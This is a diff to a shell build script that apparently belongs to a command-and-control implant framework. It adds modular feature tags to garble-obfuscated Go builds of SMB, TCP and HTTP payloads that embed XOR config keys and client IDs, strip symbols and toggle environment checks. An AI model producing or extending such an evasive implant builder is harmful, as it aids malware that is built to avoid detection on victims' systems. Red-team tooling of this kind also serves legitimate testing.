@@ -187,13 +187,33 @@ build_binary() {
     local module_name=$3
 
     echo "Building binary for ${os}/${arch}..."
-    
+
+    # Build feature tags for modular payload builds
+    # When FEATURES is set, only selected features are compiled in.
+    # When FEATURES is empty/unset, all features are included (backward compatible).
+    BUILD_TAGS=""
+    if [ -n "${FEATURES}" ]; then
+        echo "=== Modular Build Mode ==="
+        echo "Selected features: ${FEATURES}"
+        tag_list="feature_modular"
+        OLD_IFS="$IFS"
+        IFS=','
+        for feat in ${FEATURES}; do
+            feat=$(echo "$feat" | tr -d ' ')
+            [ -n "$feat" ] && tag_list="${tag_list},feature_${feat}"
+        done
+        IFS="$OLD_IFS"
+        BUILD_TAGS="-tags ${tag_list}"
+        echo "Build tags: ${tag_list}"
+        echo "==========================="
+    fi
+
     # Display HTTP method configuration
     echo "=== HTTP Method Configuration ==="
     echo "GET method: ${GET_METHOD:-GET}"
     echo "POST method: ${POST_METHOD:-POST}"
     echo "================================="
-    
+
     # Build toggle flags
     TOGGLE_FLAGS=""
     [ ! -z "${TOGGLE_CHECK_ENVIRONMENT}" ] && TOGGLE_FLAGS="${TOGGLE_FLAGS} -X 'main.toggleCheckEnvironment=${TOGGLE_CHECK_ENVIRONMENT}'"
@@ -295,7 +315,7 @@ PYEOF
     # Use different ldflags for SMB, TCP, and HTTP payloads
     if [ "${PAYLOAD_TYPE}" = "smb" ]; then
         # SMB payload - uses config key for runtime decryption
-        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build ${BUILD_TAGS} \
             -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
             -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
@@ -363,7 +383,7 @@ PYEOF
             -trimpath -o "/output/${OUTPUT_FILENAME}"
     elif [ "${PAYLOAD_TYPE}" = "tcp" ]; then
         # TCP payload - uses config key for runtime decryption
-        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build \
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny -debugdir=none build ${BUILD_TAGS} \
             -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
             -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
@@ -430,7 +450,7 @@ PYEOF
             -trimpath -o "/output/${OUTPUT_FILENAME}"
     else
         # HTTP payload - full ldflags
-        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny build \
+        GOOS=${os} GOARCH=${arch} garble -seed=random -literals -tiny build ${BUILD_TAGS} \
             -ldflags "${WINDOWS_SUBSYSTEM_FLAG} -w -s -buildid= \
             -X 'main.cfgKey=${XOR_KEY}' \
             -X 'main.clientID=${CLIENTID}' \
